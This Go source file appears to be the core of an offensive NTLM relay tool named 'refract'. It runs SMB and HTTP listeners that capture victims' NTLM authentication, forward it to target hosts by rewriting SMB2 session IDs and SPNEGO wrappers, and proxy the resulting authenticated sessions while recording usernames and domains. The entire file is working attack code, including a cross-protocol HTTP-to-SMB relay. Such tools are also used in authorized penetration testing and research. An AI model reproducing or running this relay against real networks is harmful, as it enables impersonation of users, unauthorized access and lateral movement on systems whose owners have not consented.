package relay

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/go-impacket/kit/pkg/randname"
)

// Config bundles all relay server parameters.
type Config struct {
	Pool        *TargetPool
	Vault       *Vault
	SMBPort     int
	HTTPPort    int
	IPv6        bool
	NoMulti     bool
	PostCommand string
	Timeout     time.Duration
}

// Broker orchestrates all relay listener goroutines.
type Broker struct {
	cfg      *Config
	counter  atomic.Uint64
	shutdown chan struct{}

	// pendingHTTP maps session IDs to in-flight HTTP→SMB relay sessions,
	// keyed by the X-Relay-Session header that the client echoes back.
	pendingMu  sync.Mutex
	pendingHTTP map[string]*httpRelayState
}

type httpRelayState struct {
	targetConn net.Conn
	session    *Session
	expires    time.Time
}

func NewBroker(cfg *Config) *Broker {
	return &Broker{
		cfg:         cfg,
		shutdown:    make(chan struct{}),
		pendingHTTP: make(map[string]*httpRelayState),
	}
}

func (b *Broker) Run(ctx context.Context) error {
	errCh := make(chan error, 2)

	go func() {
		if err := b.serveSMB(ctx); err != nil {
			errCh <- fmt.Errorf("SMB relay: %w", err)
		}
	}()

	go func() {
		if err := b.serveHTTP(ctx); err != nil {
			errCh <- fmt.Errorf("HTTP relay: %w", err)
		}
	}()

	go b.reapStalePending(ctx)

	select {
	case err := <-errCh:
		return err
	case <-ctx.Done():
		return ctx.Err()
	}
}

// ─── SMB2 packet helpers ──────────────────────────────────────────────────────

const (
	smb2Magic         = "\xFESMB"
	smb2HdrSize       = 64
	smb2CmdNegotiate  = 0x0000
	smb2CmdSessionSetup = 0x0001

	ntStatusOK                    = uint32(0x00000000)
	ntStatusMoreProcessingRequired = uint32(0xC0000016)
)

// readSMBPacket reads one NetBIOS-framed SMB2 packet (4-byte big-endian length prefix).
func readSMBPacket(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	size := binary.BigEndian.Uint32(hdr)
	if size > 1<<20 {
		return nil, fmt.Errorf("SMB packet size %d too large", size)
	}
	body := make([]byte, size)
	if _, err := io.ReadFull(conn, body); err != nil {
		return nil, err
	}
	return body, nil
}

// writeSMBPacket writes a NetBIOS-framed SMB2 packet.
func writeSMBPacket(conn net.Conn, body []byte) error {
	hdr := make([]byte, 4)
	binary.BigEndian.PutUint32(hdr, uint32(len(body)))
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	_, err := conn.Write(body)
	return err
}

// smb2Command returns the command code from an SMB2 header (offset 12, 2 bytes LE).
func smb2Command(pkt []byte) uint16 {
	if len(pkt) < 16 {
		return 0xFFFF
	}
	return binary.LittleEndian.Uint16(pkt[12:])
}

// smb2Status returns the NT Status from an SMB2 header (offset 8, 4 bytes LE).
func smb2Status(pkt []byte) uint32 {
	if len(pkt) < 12 {
		return 0xFFFFFFFF
	}
	return binary.LittleEndian.Uint32(pkt[8:])
}

// smb2SessionID returns the SMB2 session ID (offset 40, 8 bytes LE).
func smb2SessionID(pkt []byte) uint64 {
	if len(pkt) < 48 {
		return 0
	}
	return binary.LittleEndian.Uint64(pkt[40:])
}

// rewriteSessionID replaces the SMB2 session ID in a packet with newID.
func rewriteSessionID(pkt []byte, newID uint64) []byte {
	if len(pkt) < 48 {
		return pkt
	}
	out := make([]byte, len(pkt))
	copy(out, pkt)
	binary.LittleEndian.PutUint64(out[40:], newID)
	return out
}

// extractSetupSecBlob extracts the SecurityBuffer from an SMB2 SESSION_SETUP request.
// SESSION_SETUP structure (after the 64-byte SMB2 header):
//   StructureSize(2) + Flags(1) + SecurityMode(1) + Capabilities(4) +
//   Channel(4) + SecurityBufferOffset(2) + SecurityBufferLength(2) + PreviousSessionId(8)
//   = 24 bytes; then SecurityBuffer data at SecurityBufferOffset from packet start.
func extractSetupSecBlob(pkt []byte) ([]byte, error) {
	if len(pkt) < smb2HdrSize+24 {
		return nil, fmt.Errorf("SESSION_SETUP packet too short: %d", len(pkt))
	}
	off := binary.LittleEndian.Uint16(pkt[smb2HdrSize+12:]) // SecurityBufferOffset
	sz := binary.LittleEndian.Uint16(pkt[smb2HdrSize+14:])  // SecurityBufferLength
	if int(off)+int(sz) > len(pkt) {
		return nil, fmt.Errorf("SESSION_SETUP SecBuf out of bounds: off=%d sz=%d pktlen=%d", off, sz, len(pkt))
	}
	return pkt[off : off+sz], nil
}

// extractResponseSecBlob extracts the SecurityBuffer from an SMB2 SESSION_SETUP response.
// SESSION_SETUP response structure (after the 64-byte SMB2 header):
//   StructureSize(2) + SessionFlags(2) + SecurityBufferOffset(2) + SecurityBufferLength(2)
func extractResponseSecBlob(pkt []byte) ([]byte, error) {
	if len(pkt) < smb2HdrSize+8 {
		return nil, fmt.Errorf("SESSION_SETUP response too short: %d", len(pkt))
	}
	off := binary.LittleEndian.Uint16(pkt[smb2HdrSize+4:])
	sz := binary.LittleEndian.Uint16(pkt[smb2HdrSize+6:])
	if sz == 0 {
		return nil, nil
	}
	if int(off)+int(sz) > len(pkt) {
		return nil, fmt.Errorf("SESSION_SETUP response SecBuf out of bounds: off=%d sz=%d pktlen=%d", off, sz, len(pkt))
	}
	return pkt[off : off+sz], nil
}

// unwrapSPNEGO extracts the raw NTLM blob from a SPNEGO negTokenInit or negTokenTarg wrapper.
// Both contain the NTLM blob with its "NTLMSSP\x00" magic directly embedded.
func unwrapSPNEGO(blob []byte) []byte {
	idx := bytes.Index(blob, []byte("NTLMSSP\x00"))
	if idx >= 0 {
		return blob[idx:]
	}
	return nil
}

// reapStalePending closes and removes HTTP→SMB pending sessions that have not
// received a type-3 Authenticate within their TTL, preventing fd leaks.
func (b *Broker) reapStalePending(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			now := time.Now()
			b.pendingMu.Lock()
			for id, st := range b.pendingHTTP {
				if now.After(st.expires) {
					st.targetConn.Close()
					delete(b.pendingHTTP, id)
				}
			}
			b.pendingMu.Unlock()
		}
	}
}

// ─── SMB Relay ────────────────────────────────────────────────────────────────

func (b *Broker) serveSMB(ctx context.Context) error {
	addr := fmt.Sprintf("0.0.0.0:%d", b.cfg.SMBPort)
	if b.cfg.IPv6 {
		addr = fmt.Sprintf("[::]:%d", b.cfg.SMBPort)
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	log.Printf("[refract] SMB listener on %s", addr)
	defer ln.Close()

	go func() {
		<-ctx.Done()
		ln.Close()
	}()

	for {
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				log.Printf("[refract] SMB accept: %v", err)
				continue
			}
		}
		go b.handleSMBRelay(ctx, conn)
	}
}

func (b *Broker) handleSMBRelay(ctx context.Context, victim net.Conn) {
	defer victim.Close()

	target := b.cfg.Pool.Next(b.cfg.NoMulti)
	if target == nil {
		log.Printf("[refract] no available targets")
		return
	}

	host := target.Hostname()
	port := target.Port()
	if port == "" {
		port = "445"
	}

	targetConn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 10*time.Second)
	if err != nil {
		log.Printf("[refract] connect to target %s: %v", target, err)
		return
	}
	defer targetConn.Close()

	sessionID := randname.Hex(16)
	session := &Session{
		ID:         sessionID,
		Target:     target,
		Opened:     time.Now(),
		Protocol:   "SMB",
		targetConn: targetConn,
	}

	log.Printf("[refract] relay start victim=%s target=%s id=%s", victim.RemoteAddr(), target, sessionID)

	if err := b.bridgeSMBNTLM(victim, targetConn, session); err != nil {
		log.Printf("[refract] relay %s failed: %v", sessionID, err)
		return
	}

	b.cfg.Vault.Add(session)
	log.Printf("[+] relay success id=%s user=%s\\%s target=%s",
		sessionID, session.Domain, session.Username, target)

	if b.cfg.NoMulti {
		b.cfg.Pool.MarkDone(target)
	}

	if b.cfg.PostCommand != "" {
		log.Printf("[refract] post-relay exec not yet wired for SMB sessions (use -socks + proxychains)")
	}
}

// bridgeSMBNTLM is the core SMB2 relay state machine.
//
// It parses the SMB2 SESSION_SETUP handshake at the packet level,
// rewrites session IDs, and relays the NTLM blobs between victim and target.
// After the 3-way NTLM handshake, it proxies the stream bidirectionally.
//
// Flow:
//
//	victim → NEGOTIATE     → target (forward verbatim)
//	target → NEGOTIATE_RSP → victim (forward verbatim)
//	victim → SETUP(type1)  → target (forward, record session IDs)
//	target → SETUP(type2)  → victim (forward, extract NTLM challenge)
//	victim → SETUP(type3)  → target (forward, extract NTLM credentials)
//	target → SETUP_RSP     → victim (forward; auth done)
//	         <proxy bidirectional stream>
func (b *Broker) bridgeSMBNTLM(victim, target net.Conn, session *Session) error {
	// Phase 1: NEGOTIATE (forward verbatim both ways)
	negReq, err := readSMBPacket(victim)
	if err != nil {
		return fmt.Errorf("read victim NEGOTIATE: %w", err)
	}
	if err := writeSMBPacket(target, negReq); err != nil {
		return fmt.Errorf("send NEGOTIATE to target: %w", err)
	}

	negResp, err := readSMBPacket(target)
	if err != nil {
		return fmt.Errorf("read target NEGOTIATE response: %w", err)
	}
	if err := writeSMBPacket(victim, negResp); err != nil {
		return fmt.Errorf("send NEGOTIATE response to victim: %w", err)
	}

	// Phase 2: SESSION_SETUP round 1 — NTLM Negotiate (type 1)
	setup1, err := readSMBPacket(victim)
	if err != nil {
		return fmt.Errorf("read victim SETUP1: %w", err)
	}
	if smb2Command(setup1) != smb2CmdSessionSetup {
		return fmt.Errorf("expected SESSION_SETUP, got cmd=0x%04x", smb2Command(setup1))
	}

	session.victimSessionID = smb2SessionID(setup1)

	// Extract and record the NTLM Negotiate blob from the victim.
	secBlob1, err := extractSetupSecBlob(setup1)
	if err == nil {
		ntlm1 := unwrapSPNEGO(secBlob1)
		if ntlm1 != nil {
			session.negotiateMsg = ntlm1
		}
	}

	// Forward to target (rewrite session ID to 0 since target doesn't know the victim's ID).
	fwd1 := rewriteSessionID(setup1, 0)
	if err := writeSMBPacket(target, fwd1); err != nil {
		return fmt.Errorf("forward SETUP1 to target: %w", err)
	}

	// Read the target's SESSION_SETUP response (status=STATUS_MORE_PROCESSING_REQUIRED).
	resp1, err := readSMBPacket(target)
	if err != nil {
		return fmt.Errorf("read target SETUP1 response: %w", err)
	}

	session.targetSessionID = smb2SessionID(resp1)

	// Extract the NTLM Challenge (type 2) from the target's response.
	secBlob2, err := extractResponseSecBlob(resp1)
	if err == nil && secBlob2 != nil {
		ntlm2 := unwrapSPNEGO(secBlob2)
		if ntlm2 != nil {
			session.challengeMsg = ntlm2
		}
	}

	// Relay back to victim with the victim's session ID.
	fwdResp1 := rewriteSessionID(resp1, session.victimSessionID)
	if err := writeSMBPacket(victim, fwdResp1); err != nil {
		return fmt.Errorf("forward SETUP1 response to victim: %w", err)
	}

	// Phase 3: SESSION_SETUP round 2 — NTLM Authenticate (type 3)
	setup2, err := readSMBPacket(victim)
	if err != nil {
		return fmt.Errorf("read victim SETUP2: %w", err)
	}
	if smb2Command(setup2) != smb2CmdSessionSetup {
		return fmt.Errorf("expected SESSION_SETUP2, got cmd=0x%04x", smb2Command(setup2))
	}

	// Extract the NTLM Authenticate blob from the victim.
	secBlob3, err := extractSetupSecBlob(setup2)
	if err == nil {
		ntlm3 := unwrapSPNEGO(secBlob3)
		if ntlm3 != nil {
			session.authenticateMsg = ntlm3
			user, domain := ExtractNTLMCreds(ntlm3)
			session.Username = user
			session.Domain = domain
		}
	}

	// Rewrite victim session ID → target session ID and forward.
	fwd2 := rewriteSessionID(setup2, session.targetSessionID)
	if err := writeSMBPacket(target, fwd2); err != nil {
		return fmt.Errorf("forward SETUP2 to target: %w", err)
	}

	// Read final auth response from target.
	resp2, err := readSMBPacket(target)
	if err != nil {
		return fmt.Errorf("read target SETUP2 response: %w", err)
	}

	if smb2Status(resp2) != ntStatusOK {
		return fmt.Errorf("target rejected authentication: NTSTATUS=0x%08X", smb2Status(resp2))
	}

	// Relay back to victim.
	fwdResp2 := rewriteSessionID(resp2, session.victimSessionID)
	if err := writeSMBPacket(victim, fwdResp2); err != nil {
		return fmt.Errorf("forward SETUP2 response to victim: %w", err)
	}

	// Phase 4: Bidirectional proxy after successful authentication.
	return proxySMBStream(victim, target, session.victimSessionID, session.targetSessionID)
}

// proxySMBStream bidirectionally proxies SMB packets after auth, rewriting session IDs.
func proxySMBStream(victim, target net.Conn, victimID, targetID uint64) error {
	errCh := make(chan error, 2)

	proxy := func(src, dst net.Conn, srcID, dstID uint64) {
		for {
			pkt, err := readSMBPacket(src)
			if err != nil {
				errCh <- err
				return
			}
			out := rewriteSessionID(pkt, dstID)
			if err := writeSMBPacket(dst, out); err != nil {
				errCh <- err
				return
			}
		}
	}

	go proxy(victim, target, victimID, targetID)
	go proxy(target, victim, targetID, victimID)

	err := <-errCh
	if err == io.EOF {
		return nil
	}
	return err
}

// ─── HTTP Relay ───────────────────────────────────────────────────────────────

func (b *Broker) serveHTTP(ctx context.Context) error {
	addr := fmt.Sprintf("0.0.0.0:%d", b.cfg.HTTPPort)
	mux := http.NewServeMux()
	mux.HandleFunc("/", b.handleHTTPRelay)
	srv := &http.Server{Addr: addr, Handler: mux}

	log.Printf("[refract] HTTP listener on %s", addr)

	go func() {
		<-ctx.Done()
		srv.Close()
	}()

	if err := srv.ListenAndServe(); err != http.ErrServerClosed {
		return err
	}
	return nil
}

func (b *Broker) handleHTTPRelay(w http.ResponseWriter, r *http.Request) {
	auth := r.Header.Get("Authorization")

	if auth == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	if !strings.HasPrefix(auth, "NTLM ") {
		http.Error(w, "unsupported auth", http.StatusBadRequest)
		return
	}

	blob, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(auth, "NTLM "))
	if err != nil {
		http.Error(w, "bad auth blob", http.StatusBadRequest)
		return
	}

	msgType, err := ParseNTLMMessageType(blob)
	if err != nil {
		http.Error(w, "not NTLM", http.StatusBadRequest)
		return
	}

	switch msgType {
	case 1: // Negotiate → forward to target, return real Challenge
		challenge, sessionID, err := b.forwardNegotiateToSMB(r.Context(), blob)
		if err != nil {
			log.Printf("[refract] HTTP negotiate relay: %v", err)
			http.Error(w, "relay error", http.StatusServiceUnavailable)
			return
		}
		w.Header().Set("WWW-Authenticate", "NTLM "+base64.StdEncoding.EncodeToString(challenge))
		http.SetCookie(w, &http.Cookie{Name: "rsid", Value: sessionID, HttpOnly: true})
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(http.StatusUnauthorized)

	case 3: // Authenticate → relay to target, finalize session
		cookie, cookieErr := r.Cookie("rsid")
		if cookieErr != nil {
			http.Error(w, "missing session cookie", http.StatusBadRequest)
			return
		}
		sessionID := cookie.Value
		user, domain := ExtractNTLMCreds(blob)

		b.pendingMu.Lock()
		st := b.pendingHTTP[sessionID]
		delete(b.pendingHTTP, sessionID)
		b.pendingMu.Unlock()

		if st == nil {
			log.Printf("[refract] HTTP auth3 with unknown session ID %s", sessionID)
			http.Error(w, "unknown session", http.StatusBadRequest)
			return
		}

		st.session.Username = user
		st.session.Domain = domain
		st.session.authenticateMsg = blob

		// Forward NTLM Authenticate to the target via the already-established SMB connection.
		// We need to embed it in an SMB2 SESSION_SETUP packet and get the response.
		success := b.finalizeHTTPtoSMBRelay(st, blob)
		if err := st.targetConn.Close(); err == nil {
			// conn will be closed; ignore
		}

		if !success {
			http.Error(w, "relay auth failed", http.StatusUnauthorized)
			return
		}

		log.Printf("[+] HTTP relay success id=%s user=%s\\%s", sessionID, domain, user)
		b.cfg.Vault.Add(st.session)
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "OK")

	default:
		http.Error(w, "unexpected NTLM message type", http.StatusBadRequest)
	}
}

// forwardNegotiateToSMB opens a TCP connection to an SMB target, performs the
// SMB2 NEGOTIATE + first SESSION_SETUP (type1→type2), and returns the real
// NTLM Challenge blob to forward to the HTTP victim.
func (b *Broker) forwardNegotiateToSMB(ctx context.Context, negBlob []byte) (challenge []byte, sessionID string, err error) {
	target := b.cfg.Pool.Next(b.cfg.NoMulti)
	if target == nil {
		return nil, "", fmt.Errorf("no available targets")
	}

	host := target.Hostname()
	port := target.Port()
	if port == "" {
		port = "445"
	}

	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 10*time.Second)
	if err != nil {
		return nil, "", fmt.Errorf("connect to SMB target %s:%s: %w", host, port, err)
	}

	sessionID = randname.Hex(16)
	session := &Session{
		ID:            sessionID,
		Target:        target,
		Opened:        time.Now(),
		Protocol:      "HTTP->SMB",
		negotiateMsg:  negBlob,
		targetConn:    conn,
	}

	// Build and send SMB2 NEGOTIATE request.
	negReq := buildSMB2Negotiate()
	if err := writeSMBPacket(conn, negReq); err != nil {
		conn.Close()
		return nil, "", fmt.Errorf("send NEGOTIATE: %w", err)
	}

	negResp, err := readSMBPacket(conn)
	if err != nil {
		conn.Close()
		return nil, "", fmt.Errorf("read NEGOTIATE response: %w", err)
	}
	if smb2Command(negResp) != smb2CmdNegotiate {
		conn.Close()
		return nil, "", fmt.Errorf("expected NEGOTIATE response, got 0x%04x", smb2Command(negResp))
	}

	// Build SESSION_SETUP with the victim's NTLM Negotiate blob wrapped in SPNEGO.
	setup1 := buildSMB2SessionSetup(wrapNTLMinSPNEGO(negBlob))
	if err := writeSMBPacket(conn, setup1); err != nil {
		conn.Close()
		return nil, "", fmt.Errorf("send SESSION_SETUP1: %w", err)
	}

	resp1, err := readSMBPacket(conn)
	if err != nil {
		conn.Close()
		return nil, "", fmt.Errorf("read SESSION_SETUP1 response: %w", err)
	}

	if smb2Status(resp1) != ntStatusMoreProcessingRequired {
		conn.Close()
		return nil, "", fmt.Errorf("expected STATUS_MORE_PROCESSING_REQUIRED, got 0x%08X", smb2Status(resp1))
	}

	session.targetSessionID = smb2SessionID(resp1)

	// Extract the NTLM Challenge (type 2) from the target's response.
	secBlob, err := extractResponseSecBlob(resp1)
	if err != nil || secBlob == nil {
		conn.Close()
		return nil, "", fmt.Errorf("extract challenge blob: %v", err)
	}

	ntlmChallenge := unwrapSPNEGO(secBlob)
	if ntlmChallenge == nil {
		conn.Close()
		return nil, "", fmt.Errorf("NTLM challenge not found in SPNEGO blob")
	}

	session.challengeMsg = ntlmChallenge

	// Park the state so the type3 handler can find the connection.
	b.pendingMu.Lock()
	b.pendingHTTP[sessionID] = &httpRelayState{targetConn: conn, session: session, expires: time.Now().Add(2 * time.Minute)}
	b.pendingMu.Unlock()

	// Return the raw NTLM challenge blob (not SPNEGO-wrapped) to the HTTP handler,
	// which will base64-encode it for the WWW-Authenticate header.
	return ntlmChallenge, sessionID, nil
}

// finalizeHTTPtoSMBRelay sends the NTLM Authenticate (type3) to the target
// via the existing SMB2 connection and returns true if the server accepts.
func (b *Broker) finalizeHTTPtoSMBRelay(st *httpRelayState, authBlob []byte) bool {
	setup2 := buildSMB2SessionSetupWithID(
		wrapNTLMinSPNEGO(authBlob),
		st.session.targetSessionID,
	)
	if err := writeSMBPacket(st.targetConn, setup2); err != nil {
		log.Printf("[refract] HTTP relay: send auth3 failed: %v", err)
		return false
	}

	resp, err := readSMBPacket(st.targetConn)
	if err != nil {
		log.Printf("[refract] HTTP relay: read auth3 response: %v", err)
		return false
	}

	return smb2Status(resp) == ntStatusOK
}

// ─── Minimal SMB2 packet builders ────────────────────────────────────────────

// buildSMB2Negotiate builds a minimal SMB2 NEGOTIATE request for dialect 0x0300 (SMB 3.0).
func buildSMB2Negotiate() []byte {
	body := new(bytes.Buffer)
	binary.Write(body, binary.LittleEndian, uint16(36))   // StructureSize
	binary.Write(body, binary.LittleEndian, uint16(1))    // DialectCount
	binary.Write(body, binary.LittleEndian, uint16(0))    // SecurityMode = 0
	binary.Write(body, binary.LittleEndian, uint16(0))    // Reserved
	binary.Write(body, binary.LittleEndian, uint32(0))    // Capabilities
	body.Write(make([]byte, 16))                           // ClientGuid (zero)
	binary.Write(body, binary.LittleEndian, uint64(0))    // ClientStartTime
	binary.Write(body, binary.LittleEndian, uint16(0x0300)) // Dialect: SMB 3.0
	return buildSMB2Packet(smb2CmdNegotiate, 0, body.Bytes())
}

// buildSMB2SessionSetup builds an SMB2 SESSION_SETUP request with session ID 0.
func buildSMB2SessionSetup(secBlob []byte) []byte {
	return buildSMB2SessionSetupWithID(secBlob, 0)
}

// buildSMB2SessionSetupWithID builds an SMB2 SESSION_SETUP with a given session ID.
func buildSMB2SessionSetupWithID(secBlob []byte, sessionID uint64) []byte {
	// Fixed body is 24 bytes: StructureSize[2]+Flags[1]+SecurityMode[1]+Capabilities[4]+
	// Channel[4]+SecurityBufferOffset[2]+SecurityBufferLength[2]+PreviousSessionId[8].
	// SecurityBuffer starts immediately after, at smb2HdrSize + 24 from packet start.
	secOff := uint16(smb2HdrSize + 24)
	body := new(bytes.Buffer)
	binary.Write(body, binary.LittleEndian, uint16(25))       // StructureSize
	body.WriteByte(0)                                          // Flags
	body.WriteByte(1)                                          // SecurityMode = Signing enabled
	binary.Write(body, binary.LittleEndian, uint32(0))        // Capabilities
	binary.Write(body, binary.LittleEndian, uint32(0))        // Channel
	binary.Write(body, binary.LittleEndian, secOff)           // SecurityBufferOffset
	binary.Write(body, binary.LittleEndian, uint16(len(secBlob))) // SecurityBufferLength
	binary.Write(body, binary.LittleEndian, uint64(0))        // PreviousSessionId
	body.Write(secBlob)

	return buildSMB2Packet(smb2CmdSessionSetup, sessionID, body.Bytes())
}

// buildSMB2Packet wraps an SMB2 body in a 64-byte SMB2 header + NetBIOS framing is NOT
// added here — the caller passes this to writeSMBPacket which adds the 4-byte length prefix.
func buildSMB2Packet(cmd uint16, sessionID uint64, body []byte) []byte {
	hdr := make([]byte, smb2HdrSize)
	copy(hdr[0:], smb2Magic)                                 // ProtocolId
	binary.LittleEndian.PutUint16(hdr[4:], smb2HdrSize)     // StructureSize
	binary.LittleEndian.PutUint16(hdr[6:], 0)               // CreditCharge
	binary.LittleEndian.PutUint32(hdr[8:], 0)               // Status
	binary.LittleEndian.PutUint16(hdr[12:], cmd)             // Command
	binary.LittleEndian.PutUint16(hdr[14:], 31)              // Credits requested
	binary.LittleEndian.PutUint32(hdr[16:], 0)              // Flags (client request)
	binary.LittleEndian.PutUint32(hdr[20:], 0)              // NextCommand
	binary.LittleEndian.PutUint64(hdr[24:], 1)              // MessageId
	binary.LittleEndian.PutUint32(hdr[32:], 0)               // TreeId (must be 0 for NEGOTIATE and SESSION_SETUP)
	binary.LittleEndian.PutUint64(hdr[40:], sessionID)       // SessionId
	// Signature[16] stays zero

	return append(hdr, body...)
}

// wrapNTLMinSPNEGO wraps a raw NTLM blob in a minimal SPNEGO negTokenInit (type 1)
// or negTokenTarg (type 3) wrapper. For type 1 (Negotiate), uses negTokenInit with
// the NTLM OID. For type 3 (Authenticate), uses negTokenTarg with responseToken.
func wrapNTLMinSPNEGO(ntlm []byte) []byte {
	if len(ntlm) < 12 {
		return ntlm
	}
	msgType := binary.LittleEndian.Uint32(ntlm[8:])
	if msgType == 1 {
		return spnegoNegTokenInit(ntlm)
	}
	return spnegoNegTokenTarg(ntlm)
}

// NTLM OID: 1.3.6.1.4.1.311.2.2.10
var ntlmOID = []byte{0x06, 0x0a,
	0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

// spnegoNegTokenInit wraps an NTLM Negotiate blob in a SPNEGO negTokenInit.
func spnegoNegTokenInit(ntlm []byte) []byte {
	// mechTypes: SEQUENCE { NTLM OID }
	mechTypesInner := berSeq(ntlmOID)
	mechTypesField := berContext(0, mechTypesInner)

	// mechToken: OCTET STRING containing the NTLM blob
	mechTokenInner := berOctetString(ntlm)
	mechTokenField := berContext(2, mechTokenInner)

	// negTokenInit body
	initBody := berSeq(append(mechTypesField, mechTokenField...))

	// negTokenInit [0] EXPLICIT SEQUENCE
	negTokenInit := berContext(0, initBody)

	// SPNEGO OID: 1.3.6.1.5.5.2
	spnegoOID := []byte{0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}

	// Application tag [APPLICATION 0]
	inner := append(spnegoOID, negTokenInit...)
	return berApp(inner)
}

// spnegoNegTokenTarg wraps an NTLM Authenticate blob in a SPNEGO negTokenTarg.
func spnegoNegTokenTarg(ntlm []byte) []byte {
	// negState: ENUMERATED { accept-incomplete (1) }
	stateField := berContext(0, []byte{0x0a, 0x01, 0x01})

	// responseToken: [2] EXPLICIT OCTET STRING
	tokenField := berContext(2, berOctetString(ntlm))

	body := berSeq(append(stateField, tokenField...))
	// negTokenTarg [1] EXPLICIT
	return berContext(1, body)
}

// ─── Minimal BER/DER encoding helpers ────────────────────────────────────────

func berLen(n int) []byte {
	if n < 0x80 {
		return []byte{byte(n)}
	} else if n < 0x100 {
		return []byte{0x81, byte(n)}
	}
	return []byte{0x82, byte(n >> 8), byte(n)}
}

func berTLV(tag byte, v []byte) []byte {
	out := []byte{tag}
	out = append(out, berLen(len(v))...)
	return append(out, v...)
}

func berSeq(v []byte) []byte       { return berTLV(0x30, v) }
func berOctetString(v []byte) []byte { return berTLV(0x04, v) }
func berContext(n byte, v []byte) []byte { return berTLV(0xa0|n, v) }
func berApp(v []byte) []byte       { return berTLV(0x60, v) }
